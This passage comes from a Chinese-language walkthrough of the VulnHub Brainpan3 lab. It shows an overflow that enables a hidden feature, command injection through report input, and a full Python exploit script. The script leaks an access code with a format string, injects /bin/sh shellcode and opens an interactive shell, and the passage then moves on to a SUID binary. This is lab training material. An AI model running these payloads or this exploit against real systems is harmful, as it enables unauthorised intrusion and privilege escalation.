<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># python test.py </span></span><br><span class="line">login code -&gt;  [<span class="string">&#x27;2433&#x27;</span>]</span><br><span class="line">0 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">1 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">2 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">3 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">4 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">5 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">6 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">7 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">8 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">9 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">10 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">11 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">12 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">13 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">14 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">15 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">16 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">17 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">18 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">19 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">20 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">21 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">22 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">23 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">24 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">25 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">26 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">27 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">28 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">29 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">30 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">31 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">32 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">...</span><br><span class="line">244 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">245 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">246 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">247 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">248 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">249 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">250 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">251 -&gt; [<span class="string">&#x27;\x00&#x27;</span>]</span><br><span class="line">252 -&gt; [<span class="string">&#x27;\x00&#x27;</span>]</span><br><span class="line">253 -&gt; [<span class="string">&#x27;Y&#x27;</span>]</span><br><span class="line">payload -&gt; 253 * Y</span><br></pre></td></tr></table></figure>

<p>因此，通过将session名称设置为253个Y字符，将REPORT功能状态从N更改为Y，从而有效地启用了report功能。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>在测试该选项时，现在可以看到其确实启用了……</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">fuckfuckfuckfuckfuck</span><br><span class="line"></span><br><span class="line">REPORT [fuckfuckfuckfuckfuck@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200205215605.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [II]</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>因此，现在可以在Brainpan控制台中创建报告，并在报告可执行文件中触发易受攻击的代码，不是吗？似乎Brainpan控制台使用1选项执行了报告可执行文件，并且为了触发record_id中的易受攻击的代码，需要使用0选项来执行它。在这里有些卡住，要在报告缓冲区中打更多的主意。在报表数据中插入双引号时，会出现一个有趣的错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">aaa<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REPORT [aaa&quot;</span>fuckfuckfuckfuck@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">sh: 1: Syntax error: Unterminated quoted string</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>似乎双引号引起了执行报告命令行时的错误，更准确地说，是未引用的字符串的一部分，但更有趣的是，似乎可以使用报告数据进行命令注入。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;;id;&quot;</span></span><br><span class="line"></span><br><span class="line">REPORT [<span class="string">&quot;;id;&quot;</span>ckfuckfuckfuck@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">/var/www/repo/report &lt;report&gt; [0|1]</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">sh: 1: ckfuckfuckfuck@: not found</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;;ls;&quot;</span>          </span><br><span class="line"></span><br><span class="line">REPORT [<span class="string">&quot;;ls;&quot;</span>ckfuckfuckfuck@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">/var/www/repo/report &lt;report&gt; [0|1]</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd.img</span><br><span class="line">initrd.img.old</span><br><span class="line">lib</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line">vmlinuz.old</span><br><span class="line">sh: 1: ckfuckfuckfuck@: not found</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>还可以在命令行中插入0来触发record_id中的易受攻击的代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">aasdcasdc<span class="string">&quot; 0 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REPORT [aasdcasdc&quot;</span> 0 <span class="comment">#ckfuck@]</span></span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<h3 id="编写python脚本来利用"><a href="#编写python脚本来利用" class="headerlink" title="编写python脚本来利用"></a>编写python脚本来利用</h3><p> – 获取登录代码并登录<br> – 启用report功能<br> – 发送包含0选项的payload report<br> – 获取shell</p>
<p>以下代码自动完成了整个过程：</p>
<p>report.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from select import select</span><br><span class="line">from socket import *</span><br><span class="line">from time import sleep</span><br><span class="line">import telnetlib, sys, re, struct</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class NetcatClass:</span><br><span class="line">    def __init__(self, host, port):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Netcat Class init.</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = int(port)</span><br><span class="line">        self.delay = 0.05</span><br><span class="line">        self.linemode = False</span><br><span class="line">        self.sock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># private functions</span></span><br><span class="line">    def __check_state(self, timeout=0):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Check the socket it&#x27;s read, write and exception state </span></span><br><span class="line"><span class="string">        using select</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment"># we need abit of a delay to keep things</span></span><br><span class="line">        <span class="comment"># running smooth</span></span><br><span class="line">        sleep(self.delay)</span><br><span class="line">        <span class="built_in">return</span> select([self.sock], [self.sock], [self.sock], timeout)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># core functions</span></span><br><span class="line">    def connect(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Connect to host</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            self.sock.connect((self.host, self.port))</span><br><span class="line">            <span class="built_in">return</span> True</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line"> </span><br><span class="line">    def close(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Close the connection</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            self.sock.close()</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def recv(self, size=4096):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Recieve all data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="keyword">if</span> readable:</span><br><span class="line">                <span class="comment"># while socket readable...</span></span><br><span class="line">                <span class="keyword">while</span> readable:</span><br><span class="line">                    <span class="comment"># collect all data</span></span><br><span class="line">                    data += self.sock.recv(size)</span><br><span class="line">                    <span class="comment"># re-check socket&#x27;s state</span></span><br><span class="line">                    readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="built_in">return</span> data</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def send(self, data):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Send data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="keyword">if</span> writable:</span><br><span class="line">                <span class="keyword">if</span> self.linemode:</span><br><span class="line">                    data += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                self.sock.sendall(data)</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def sendrecv(self, data):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Send and recieve data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        self.send(data)</span><br><span class="line">        <span class="built_in">return</span> self.recv()</span><br><span class="line"> </span><br><span class="line">    def interact(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Interactive telnet client</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            t = telnetlib.Telnet()</span><br><span class="line">            t.sock = self.sock</span><br><span class="line">            t.interact()</span><br><span class="line">            t.close()</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            self.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"> </span><br><span class="line">def exploit(host, port):</span><br><span class="line">    <span class="comment"># connect</span></span><br><span class="line">    s = NetcatClass(host, port)</span><br><span class="line">    <span class="comment"># make all sends being treathed as line&#x27;s eq. add a \n</span></span><br><span class="line">    s.linemode = True</span><br><span class="line">    s.connect()</span><br><span class="line">    <span class="comment"># recieve banner</span></span><br><span class="line">    s.recv()</span><br><span class="line">    <span class="comment"># send formatstring pattern and read response containing access code    </span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Leak access code&#x27;</span></span><br><span class="line">    acccode = re.findall(r<span class="string">&quot;INVALID ACCESS CODE: (.*?)\n&quot;</span>, s.sendrecv(<span class="string">&#x27;%3$d&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> not acccode:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[!] Failed to get access code!&#x27;</span></span><br><span class="line">        s.close()</span><br><span class="line">        <span class="built_in">exit</span>()  </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Access code leaked: &#123;&#125;&#x27;</span>.format(acccode[0])</span><br><span class="line">    <span class="comment"># send access code</span></span><br><span class="line">    s.sendrecv(acccode[0])</span><br><span class="line">    <span class="comment"># enable report feature</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Enabling report feature&#x27;</span></span><br><span class="line">    s.sendrecv(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    s.sendrecv(253 * <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">    <span class="comment"># create payload</span></span><br><span class="line">    <span class="comment"># linux/x86 Shellcode execve (&quot;/bin/sh&quot;) - 21 Bytes</span></span><br><span class="line">    <span class="comment"># http://shell-storm.org/shellcode/files/shellcode-752.php</span></span><br><span class="line">    shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">    <span class="comment"># .bss:0804B0A0 ; char REPORT[500]</span></span><br><span class="line">    <span class="comment"># strncpy(REPORT, buf, 100u);</span></span><br><span class="line">    __bss_REPORT = 0x0804B0A0</span><br><span class="line">    <span class="comment"># construct payload report  </span></span><br><span class="line">    payload  = <span class="string">&quot;AAA&quot;</span></span><br><span class="line">    payload += p(__bss_REPORT + 7)</span><br><span class="line">    payload += shellcode</span><br><span class="line">    <span class="comment"># inject double qoute and a 0 to trigger</span></span><br><span class="line">    <span class="comment"># the vulnerable code in record_id</span></span><br><span class="line">    payload += <span class="string">&#x27;&quot; 0 #&#x27;</span></span><br><span class="line">    <span class="comment"># send payload report</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Sending payload report&#x27;</span></span><br><span class="line">    s.sendrecv(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    s.sendrecv( payload )</span><br><span class="line">    <span class="comment"># interactive shell?</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Dropping into shell&#x27;</span></span><br><span class="line">    s.send(<span class="string">&#x27;python -c &quot;import pty;pty.spawn(\&#x27;</span>/bin/bash\<span class="string">&#x27;)&quot;&#x27;</span>)</span><br><span class="line">    s.interact()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit(<span class="string">&#x27;192.168.56.117&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后执行漏洞利用程序为anansi用户获取了一个shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># python report.py </span></span><br><span class="line">[+] Leak access code</span><br><span class="line">[+] Access code leaked: 2602</span><br><span class="line">[+] Enabling report feature</span><br><span class="line">[+] Sending payload report</span><br><span class="line">[+] Dropping into shell</span><br><span class="line">anansi@brainpan3:/$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">anansi@brainpan3:/$ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br><span class="line">anansi@brainpan3:/$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">anansi@brainpan3:/$ ls</span><br><span class="line">ls</span><br><span class="line">bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz</span><br><span class="line">boot  home        lib             mnt    root  srv   usr  vmlinuz.old</span><br><span class="line">dev   initrd.img  lost+found      opt    run   sys   var</span><br><span class="line">anansi@brainpan3:/$ <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">anansi@brainpan3:/home$ ls</span><br><span class="line">ls</span><br><span class="line">anansi  puck  reynard</span><br><span class="line">anansi@brainpan3:/home$ <span class="built_in">cd</span> anansi</span><br><span class="line"><span class="built_in">cd</span> anansi</span><br><span class="line">anansi@brainpan3:/home/anansi$ ls</span><br><span class="line">ls</span><br><span class="line">REPORTS  lapinblanc.txt</span><br><span class="line">anansi@brainpan3:/home/anansi$ cat lapinblanc.txt</span><br><span class="line">cat lapinblanc.txt</span><br><span class="line"></span><br><span class="line">                     _       _</span><br><span class="line">                    / \     / \</span><br><span class="line">                   &#123;   &#125;   &#123;   &#125;</span><br><span class="line">                   &#123;   &#123;   &#125;   &#125;</span><br><span class="line">                    \   \ /   /</span><br><span class="line">                     \   Y   /</span><br><span class="line">                     .-<span class="string">&quot;`&quot;</span>`<span class="string">&quot;-.</span></span><br><span class="line"><span class="string">                   ,`         `.</span></span><br><span class="line"><span class="string">                  /             \</span></span><br><span class="line"><span class="string">                 /               \</span></span><br><span class="line"><span class="string">                &#123;     ;&quot;</span><span class="string">&quot;;,       &#125;</span></span><br><span class="line"><span class="string">                &#123;  /&quot;</span>;`<span class="string">&#x27;`,;       &#125;</span></span><br><span class="line"><span class="string">                 \&#123;  ;`,&#x27;</span>`;.     /</span><br><span class="line">                  &#123;  &#125;`<span class="string">&quot;&quot;</span>`  &#125;   /&#125;</span><br><span class="line">                  &#123;  &#125;      &#123;  //  f o l l o w</span><br><span class="line">                  &#123;||&#125;      &#123;  /       m e</span><br><span class="line">                  `<span class="string">&quot;&#x27;       `&quot;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub202.jpg"></p>
<h3 id="reynard"><a href="#reynard" class="headerlink" title="reynard"></a>reynard</h3><p>在box上寻找时，发现reynard文件夹是可读的，并且在“/private/”文件夹中具有SUID可执行文件和加密文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/home/reynard/private$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 20K</span><br><span class="line">drwxrwx--- 2 reynard webdev  4.0K Jun 10  2015 .</span><br><span class="line">drwxr-xr-x 3 reynard reynard 4.0K Jun 10  2015 ..</span><br><span class="line">-rwsr-xr-x 1 reynard reynard 5.5K May 19  2015 cryptor</span><br><span class="line">-r-------- 1 reynard reynard   77 May 21  2015 sekret.txt.enc</span><br><span class="line">anansi@brainpan3:/home/reynard/private$ ./cryptor</span><br><span class="line">./cryptor</span><br><span class="line">Usage: ./cryptor file key</span><br></pre></td></tr></table></figure>

<p>将两个文件都下载到了本地计算机，并开始分析cryptor可执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/home/anansi$ cp /home/reynard/private/cryptor .</span><br><span class="line">cp /home/reynard/private/cryptor .</span><br><span class="line">anansi@brainpan3:/home/anansi$ ls</span><br><span class="line">ls</span><br><span class="line">REPORTS  cryptor  lapinblanc.txt</span><br><span class="line">anansi@brainpan3:/home/anansi$ python -m SimpleHTTPServer 8080</span><br><span class="line">python -m SimpleHTTPServer 8080</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8080 ...</span><br><span class="line">192.168.56.1 - - [06/Feb/2020 05:45:39] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [06/Feb/2020 05:45:48] <span class="string">&quot;GET /cryptor HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [06/Feb/2020 05:46:07] <span class="string">&quot;GET /lapinblanc.txt HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub203.jpg"></p>
<p>下面是它的c语言伪代码</p>
<p>main</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int a1, char **a2)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_80485ED(a2[1], a2[2]);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s file key\n&quot;</span>, *a2);</span><br><span class="line">    result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_80485ED</p>
